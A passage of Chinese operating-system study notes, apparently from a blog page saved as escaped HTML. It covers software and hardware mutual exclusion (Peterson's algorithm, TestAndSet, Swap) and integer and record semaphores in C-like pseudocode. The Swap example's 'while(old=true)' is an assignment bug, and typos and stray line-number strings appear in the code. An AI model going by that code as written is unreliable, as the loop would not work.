punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;turn&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;turn&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p2 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;turn&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;turn&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;遵循空闲让进、忙则等待、有限等待三个原则&lt;/p&gt;
&lt;p&gt;但是未遵循让权等待的原则&lt;/p&gt;
&lt;h2 id=&#34;四种进程互斥软件实现方法总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#四种进程互斥软件实现方法总结&#34;&gt;#&lt;/a&gt; 四种进程互斥软件实现方法总结&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726160621241.png&#34; alt=&#34;image-20230726160621241&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_3-进程互斥的硬件实现方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_3-进程互斥的硬件实现方法&#34;&gt;#&lt;/a&gt; 2.3_3 进程互斥的硬件实现方法&lt;/h3&gt;
&lt;p&gt;1、中断屏蔽方法&lt;/p&gt;
&lt;p&gt;关中断（不允许进程中断）&lt;/p&gt;
&lt;p&gt;临界区&lt;/p&gt;
&lt;p&gt;开中断&lt;/p&gt;
&lt;p&gt;简单、高校&lt;/p&gt;
&lt;p&gt;多处理机，可能会同时访问临界资源&lt;/p&gt;
&lt;p&gt;使用 OS 内核进程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726162745309.png&#34; alt=&#34;image-20230726162745309&#34;&gt;&lt;/p&gt;
&lt;p&gt;2、TestAndSet（TSL 指令）&lt;/p&gt;
&lt;p&gt;TSL 是用硬件实现的，上锁、检查一气呵成&lt;/p&gt;
&lt;p&gt;不满足让权等待，会盲等&lt;/p&gt;
&lt;p&gt;C 语言描述逻辑：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 布尔型共享变量 10ck 表示当前临界区是否被加锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//true 表示已加锁，false 表示未加锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bool &lt;span class=&#34;token function&#34;&gt;TestAndSet&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bool &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;lock&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    bool old&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    old&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;lock&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//old 用来存放 Lock 原来的值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;lock&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;true&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 无论之前是否已加锁，都将 1ock 设为 true&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; old&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 返回 Lock 原来的值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 以下是使用 TSL 指令实现互斥的算法逻辑&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;TestAndSet&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;lock&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 上锁并检查&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;临界区代码段&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lock&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;false&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 解锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;12345678910111213&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;3、Swap 指令&lt;/p&gt;
&lt;p&gt;别称：Exchange 指令、XCHG 指令&lt;/p&gt;
&lt;p&gt;Swap 指令是用硬件实现的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//true 表示已经上锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;Swap&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bool &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bool &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    bool temp&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    temp&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;b&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;temp&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 以下是使用 Swap 指令实现互斥的算法逻辑&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bool old&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;true&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;old&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;true&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;Swap&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;lock&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;old&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;临界区代码段&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lock&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;false&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 解锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 剩余代码段&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;123456789101112131415&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;简单&lt;/p&gt;
&lt;p&gt;适用多处理机&lt;/p&gt;
&lt;p&gt;不能让权等待&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726163538687.png&#34; alt=&#34;image-20230726163538687&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_4-信号量机制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_4-信号量机制&#34;&gt;#&lt;/a&gt; 2.3_4 信号量机制&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726180939994.png&#34; alt=&#34;image-20230726180939994&#34;&gt;&lt;/p&gt;
&lt;p&gt;信号量：&lt;/p&gt;
&lt;p&gt;信号量是一种变量，表示系统中某种资源的数量&lt;/p&gt;
&lt;p&gt;一对原语：wait（S）原语和 signal（S）原语，分别简称 P（S）、V（S）&lt;/p&gt;
&lt;p&gt;1、整形信号量&lt;/p&gt;
&lt;p&gt;用一个整数表示系统资源的变量，用来表示系统中某种资源的数量&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; S&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;wait&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//wait 原语，相当于：进入区&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 如果资源数不够，就意志循环等待&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;S&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 如果资源数够，则占用一个资源&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;signal&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//signal 原语，相当于 “退出区”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;S&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;         &lt;span class=&#34;token comment&#34;&gt;// 使用完资源后，在退出区释放资源&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可能会出现盲等&lt;/p&gt;
&lt;p&gt;2、记录型信号量&lt;/p&gt;
&lt;p&gt;记录型数据结构表示的信号量&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 记录型信号量的定义&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; value&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 剩余资源数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;L&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 等待队列&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; semaphore&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 某进程需要使用资源时，通过 wait 原语申请&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;wait&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;semaphore S&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;block&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;L&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span 